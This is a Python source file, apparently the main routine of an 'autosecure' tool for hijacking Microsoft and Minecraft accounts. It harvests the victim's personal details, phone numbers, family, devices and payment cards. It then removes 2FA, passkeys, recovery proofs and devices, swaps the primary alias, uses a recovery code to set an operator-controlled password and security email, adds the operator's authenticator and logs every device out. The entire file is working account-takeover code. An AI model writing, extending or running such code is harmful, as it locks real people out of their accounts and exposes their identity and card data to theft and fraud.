from securing.utils.security.change_primary_alias import change_primary_alias
from securing.utils.security.add_authenticator import add_authenticator
from securing.utils.security.get_recovery_code import get_recovery_code
from securing.utils.security_information import security_information
from securing.utils.security.remove_services import remove_services
from securing.utils.security.remove_devices import remove_devices
from securing.utils.security.delete_aliases import delete_aliases
from securing.utils.security.remove_proof import remove_proof
from securing.utils.security.remove_zyger import remove_zyger
from securing.utils.security.remove_2fa import remove_2fa
from securing.utils.security.recovery import recover

from securing.utils.ogi.get_subscriptions import get_subscriptions
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_family import get_family
from securing.utils.ogi.get_cards import get_cards
from securing.utils.ogi.get_contacts import get_contacts

from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_amc import get_amc

from securing.utils.security.logout_all import logout_all

from minecraft.get_profile import get_profile
from minecraft.get_ssid import get_ssid

from minecraft.get_namechange import get_username_info
from minecraft.get_method import get_method
from minecraft.get_capes import get_capes
from minecraft.get_xbl import get_xbl

from database.database import DBConnection
import httpx
import uuid
import json
import time

database = DBConnection()

async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config/config.json", "r"))
    replace_alias = config["autosecure"]["replace_main_alias"]
    enable_2fa = config["autosecure"]["enable_2fa"]
    domain = config["domain"]
    
    # Token needed to make API requests for the account
    verification_tokens = await get_amc(session)

    apicanary = await get_cookies(session) 
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await get_xbl(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await get_ssid(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")

            capes = await get_capes(ssid)
            if capes:
                accountInfo["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["minecraft"]["capes"] = "No capes"

            # Gets account name
            profile = await get_profile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["minecraft"]["SSID"] = ssid
                accountInfo["minecraft"]["name"] = profile
                
                # Wether its changeable
                usernameInfo = await get_username_info(ssid)
                if not usernameInfo:
                    accountInfo["minecraft"]["uchange"] = "Yes"
                else:
                    accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"

            # Minecraft purchase method
            method = await get_method(ssid)
            if method:
                accountInfo["minecraft"]["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["minecraft"]["name"] = "No Minecraft"

    # Gets account info via microsofts API
    subscriptions = await get_subscriptions(session, verification_tokens[0])
    family = await get_family(session, verification_tokens[0])
    devices = await get_devices(session, verification_tokens[0])
    cards = await get_cards(session, verification_tokens[0])
    contacts = await get_contacts(session, verification_tokens[0])

    owner_info = await get_owner_info(session, verification_tokens[1])

    print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
    accountInfo["microsoft"]["firstName"] = owner_info["firstName"]
    accountInfo["microsoft"]["lastName"] = owner_info["lastName"]
    accountInfo["microsoft"]["fullName"] = owner_info["fullName"]
    accountInfo["microsoft"]["region"] = owner_info["region"]
    accountInfo["microsoft"]["birthday"] = owner_info["birthday"]
    accountInfo["microsoft"]["language"] = owner_info["msaDisplayLanguage"]
    accountInfo["microsoft"]["phones"] = contacts["msaPhones"] + contacts["mmxPhones"]

    accountInfo["microsoft"]["family"] = family["members"]
    accountInfo["microsoft"]["devices"] = devices["devices"]
    accountInfo["microsoft"]["cards"] = cards["paymentInstruments"]
    accountInfo["microsoft"]["subscriptions"] = {
        "active":     subscriptions["active"],
        "canceled":   subscriptions["canceled"],
        "commercial": subscriptions["commercial"],
    }
        
    # 2FA
    await remove_2fa(session, apicanary)

    # Pass Keys / Windows Hello Exploit
    await remove_zyger(session, apicanary)

    # Removes security_emails / Auth Apps
    await remove_proof(session, apicanary)
    print("[+] - Removed all Proofs")
    
    # Third Party Launchers (Minecraft, Prism)
    await remove_services(session)

    # Remove Microsoft Devices
    await remove_devices(session, verification_tokens[2], devices)

    securityParameters = json.loads(await security_information(session))
    print("[+] - Got Security Parameters")

    if securityParameters:
        # Original Email
        main_email = securityParameters["email"]
        print(f"Main EMail: {main_email}")

        # Changes Primary Alias
        if replace_alias:
            print("[~] - Changing Primary Alias")
            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
            change_alias = await change_primary_alias(session, primaryEmail, apicanary)
            if change_alias:
                accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
            else:
                print(f"[X] - Failed to change Primary Email")
        
        if recovery:
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]

            # Gets recovery code
            recovery_code = await get_recovery_code(
                session,
                apicanary,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recovery_code}")

            security_email = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]

            security_email = f"{security_email}@{domain}"
            print(f"[+] - Generated Security Email ({security_email})")
            database.add_security_email(security_email, password)

            # Changes password & generate a new recovery code
            print("[~] - Automaticly Securing Account...")
            data = await recover(session, main_email, recovery_code, security_email, password)

            if data and data != "invalid":
                accountInfo["microsoft"]["security_email"] = security_email
                accountInfo["microsoft"]["recovery_code"] = data
                accountInfo["microsoft"]["password"] = password
            else:
                print(f"[X] - Failed to secure this account")

    # Delete other login aliases
    await delete_aliases(session)
    
    # Add Authenticator
    if enable_2fa:
        auth = await add_authenticator(session)
        accountInfo["microsoft"]["auth_secret"] = auth
        print(f"[+] - Added Authenticator ({auth})")
        
    # Logout all devices
    await logout_all(session, apicanary)
    print("[+] - Account has been secured")

    return accountInfo